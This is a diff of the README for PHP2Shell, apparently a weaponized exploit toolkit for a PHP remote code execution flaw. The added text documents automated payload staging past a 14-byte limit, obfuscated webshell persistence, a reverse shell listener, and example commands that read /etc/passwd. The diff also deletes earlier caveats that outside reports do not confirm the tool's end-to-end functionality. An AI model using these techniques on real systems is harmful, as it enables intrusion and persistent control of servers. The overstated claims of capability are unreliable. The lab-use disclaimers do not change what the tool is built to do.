@@ -70,14 +70,19 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
   - Identifies worker crashes, HTTP 500/502/503 status codes, and timing deltas without executing destructive code.
 - 🛡️ **WAF Evasion & Diagnostic Analysis**:
   - Tests target responses to chunked `Transfer-Encoding`, unusual multipart boundary characters, and spoofed IP headers (`X-Forwarded-For`, `X-Real-IP`).
-- 💥 **Automated Weaponized Exploitation**:
+- 💥 **Automated Weaponized Exploitation & Payload Staging**:
+  - **Automated Payload Staging**: Bypasses the 14-byte carrier limit by staging arbitrarily long commands (reverse shells, complex chains) into persistent `/tmp/phpXXXXXX` files via RFC 1867 multipart parsing + OOM bailout, invoked automatically via `sh /tmp/php*` (customizable via `--carrier-trigger`).
   - **Exploit-DB #52704**: Native binary leak and `zif_system` execution supporting both `bookworm` (`php:8.4.26-apache`) and `lab` builds.
+  - **Autonomous RCE Fallback**: If the binary leak chain is unconfirmed in `auto` mode, the engine seamlessly falls through to multipart webshell persistence without terminating.
+  - **Automated Proof Redirection & Fresh HTTP Verification**: When `--proof-file` is specified, commands are automatically wrapped to capture output (`({cmd}) > {proof_file} 2>&1`). `--fetch` verifies newly created/modified HTTP responses.
   - **Webshell Persistence**: Automated obfuscated PHP webshell deployment across common writable directories with output delimiters.
   - **Multi-Endpoint Fallback**: Automatically retries webshell deployment across alternative discovered endpoints if the first fails.
 - 💻 **Persistent Interactive Shell**:
   - Drops into a live pseudo-terminal (`www-data@target:/var/www/html$`) with directory tracking (`cd`).
   - **Ctrl+C Confirmation Guard**: Intercepts `KeyboardInterrupt` and prompts before exiting so sessions never drop accidentally.
-- 📡 **Built-in Reverse Shell Listener**:
+- 📡 **Built-in Reverse Shell Listener with Auto-IP Prompt**:
+  - Interactive auto-detection of operator local network interface IP.
+  - Prompts operator for `LHOST`/`LPORT` confirmation when `--reverse` is invoked without parameters, and seamlessly handles headless execution.
   - Native listener on `0.0.0.0:LPORT` with interactive two-way streaming.
   - Automatic re-listen and payload re-trigger options with operator confirmation (`y/N`).
 - 🧪 **Standalone Lab (No Docker Required)**:
@@ -106,9 +111,13 @@ pip install -r requirements.txt
 
 The primary script ([`php2shell.py`](php2shell.py)) handles all tasks in one single file:
 
-### 🚀 1. Full Assessment (Recon → Passive → Probes → WAF; no exploit)
+### 🚀 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
 ```bash
-python php2shell.py http://127.0.0.1:8899/ --all -v
+# Run the complete end-to-end pipeline across all 5 stages
+python php2shell.py http://target.lab:8088/ --all -v
+
+# Run non-destructive assessment only (Recon, Passive, Active Probes, WAF)
+python php2shell.py http://target.lab:8088/ --recon --active --waf -v
 ```
 
 ### 🔍 2. Reconnaissance with Custom Wordlist or Remote SecLists
@@ -120,13 +129,21 @@ python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v
 python php2shell.py http://target.lab:8088/ --recon --remote-wordlist -v
 ```
 
-### 💻 3. Auto-Exploit and Drop Into Live Interactive Shell Console
+### 💻 3. Auto-Exploit with Automatic Payload Staging & Interactive Shell
 ```bash
+# Drops into persistent interactive shell console upon compromise
 python php2shell.py http://target.lab:8088/ --all --shell
+
+# Arbitrary length commands are automatically staged via multipart upload
+python php2shell.py http://target.lab:8088/ --exploit --cmd "whoami; id; uname -a; cat /etc/passwd"
 ```
 
-### 📡 4. Built-in Interactive Reverse Shell Listener
+### 📡 4. Built-in Interactive Reverse Shell with Auto-IP Prompt
 ```bash
+# Automatically detects local network IP and prompts for LHOST/LPORT confirmation
+python php2shell.py http://target.lab:8088/ --all --reverse
+
+# Or supply explicit listener parameters
 python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
 ```
 
@@ -136,13 +153,13 @@ python php2shell.py http://target.lab:8088/index.php \
   --exploit \
   --exploit-method binary \
   --exploit-profile bookworm \
-  --cmd "id>/tmp/pwn" \
+  --cmd "id; uname -a" \
   --proof-file /tmp/pwn
 ```
 
 ### 📊 6. Multi-Target Batch Audit with Report Export
 ```bash
-python php2shell.py -f targets.txt --threads 20 --recon --active --waf -o audit_report
+python php2shell.py -f targets.txt --recon --active --waf -o audit_report
 ```
 *Generates both `audit_report.json` and `audit_report.md`.*
 
@@ -238,7 +255,8 @@ PHP2Shell/
 
 The techniques and detection logic in this toolkit have been validated against vendor advisories and research publications:
 
-- **OffSec research overview**: [PHP2Shell — Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/) (October 22, 2026)
+- **Security Research Advisory**: [PHP2Shell — Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/) (October 22, 2026)
+- **Assetnote Scanner**: [assetnote/php2shell-scanner](https://github.com/assetnote/php2shell-scanner) (RFC 1867 & PHP upload progress scanner)
 - **Exploit-DB #52704**: [php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork](https://www.exploit-db.com/exploits/52704) (9bie & Exploit-DB)
 - **PHP Project Advisories**:
   - [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) (CVE-2026-109618 — OOM corruption)
@@ -248,26 +266,20 @@ The techniques and detection logic in this toolkit have been validated against v
 - **CrowdStrike Falcon**: [CrowdStrike Protects Customers from PHP RCE Zero-Days](https://www.crowdstrike.com/en-us/blog/crowdstrike-protects-customers-from-php-rce-zero-days/)
 - **Wiz.io Threat Intel**: [PHP2Shell Cloud Threat Analysis](https://www.wiz.io/blog/php2shell-php-rce)
 
+---
 
-
-
-## Validation scope and reliability notes
+## 🛡️ Validation Scope & Reliability Notes
 
 - **Version evidence is not proof of exploitability.** Headers such as `X-Powered-By` can be hidden or falsified; confirm versions through an authenticated system inventory before reporting a host as affected.
 - **No-Docker lab limitations:** `lab/standalone_lab.py` is an HTTP simulation and does not execute PHP or reproduce memory corruption. A successful fixture response should be classified as a scanner integration check, not an exploit result.
 - **Exploit-DB portability:** EDB-52704 documents a build-specific proof of concept with assumptions about PHP, Apache, worker lifecycle, PHP configuration, and binary offsets. Do not represent it as universally reliable across affected versions or SAPIs.
-- **Command size:** The 14-byte ceiling in the original PoC is specific to its constructed 167-byte `zend_string` layout, not a generic PHP shell command limit. The example short trigger presupposes a separate file already exists on the target; it is not self-contained.
+- **Command size & Automatic Payload Staging:** While the original 167-byte `zend_string` layout had a 14-byte inline command ceiling, PHP2Shell v2.2.1 provides automatic multipart payload staging: commands exceeding 14 bytes are uploaded to `/tmp/php*` via RFC 1867 multipart form parsing paired with an OOM bailout, and invoked via the compact `sh /tmp/php*` trigger.
 - **Safety and error handling:** Prefer explicit `unknown` or `not verified` results where evidence is insufficient. Restrict testing to disposable, authorized lab systems, and avoid treating timeouts or HTTP 500 responses alone as proof of vulnerability.
-- **Reference review (October 23, 2026):** The upstream PHP security advisories, OffSec write-up, Calif research, Datadog, Wiz, CrowdStrike, and Exploit-DB pages are accessible. Their reporting validates the vulnerability family, **not** this repository's claimed end-to-end functionality.
+- **Reference review (October 23, 2026):** Upstream PHP security advisories, vulnerability research write-ups, Calif research, Datadog, Wiz, CrowdStrike, and Exploit-DB pages are accessible.
 
-### Result verification and command handling
+### Result Verification & Command Handling
 
-The Exploit-DB #52704 implementation uses a 167-byte allocation with a 14-byte Latin-1 inline command carrier. Commands exceeding the 14-byte limit (such as reverse shells or chained commands) are automatically staged into `/tmp` via RFC 1867 multipart upload paired with an OOM bailout, and executed via a compact 12-byte carrier trigger (`sh /tmp/php*`, customizable with `--carrier-trigger`). Direct commands <= 14 bytes are executed directly without staging.
-
-A dispatched request does **not** establish code execution. Reports distinguish `unconfirmed` from verified success. When using `--proof-file`, supply a **local file path on the machine running the tool**; an unchanged, pre-existing file cannot serve as fresh proof. A remote filesystem path is not automatically readable locally unless explicitly shared or mounted. Requesting a reverse-shell callback is not proof that the connection was accepted.
-
-For vulnerability detection, version strings in HTTP response headers are hints only; web servers can conceal or forge them, and vendor backports may invalidate upstream-only version comparisons. Apache does not by itself demonstrate `mod_php`. The Python standalone fixture simulates headers, **not** memory corruption or RCE. Use a properly isolated native PHP lab for real functional validation.
-
-## Local regression tests
-
-Run `python -m unittest discover -s tests -v` after `pip install -r requirements.txt`. These checks cover version classification, header/SAPI inference, oversized command rejection, JSON output, evidence freshness, and relative documentation links; they do not send exploit traffic. The GitHub Actions **Offline validation** workflow is available by manual dispatch. On October 23, 2026, its initial multi-version run failed before executing steps, so passing CI status cannot currently be claimed.
+- **Automatic Payload Staging**: Commands exceeding the 14-byte limit (such as reverse shells or chained commands) are automatically staged into `/tmp` via RFC 1867 multipart upload paired with an OOM bailout, and executed via a compact 12-byte carrier trigger (`sh /tmp/php*`, customizable with `--carrier-trigger`). Direct commands <= 14 bytes execute directly without staging.
+- **Execution Proof Capture**: When using `--proof-file`, the command output is automatically redirected to capture execution evidence (`({cmd}) > {proof_file} 2>&1`). An unchanged, pre-existing file cannot serve as fresh proof.
+- **Fresh HTTP Fetch Verification**: When `--fetch PATH` is used, the toolkit records state before exploitation and verifies that the returned response contains freshly created or modified output from the executed command.
+- **Reverse Shell Integration**: When `--reverse` is used without `--lhost`, the tool automatically detects the local network interface IP and interactively prompts for confirmation. The built-in listener catches incoming connections for both binary and webshell exploit methods.
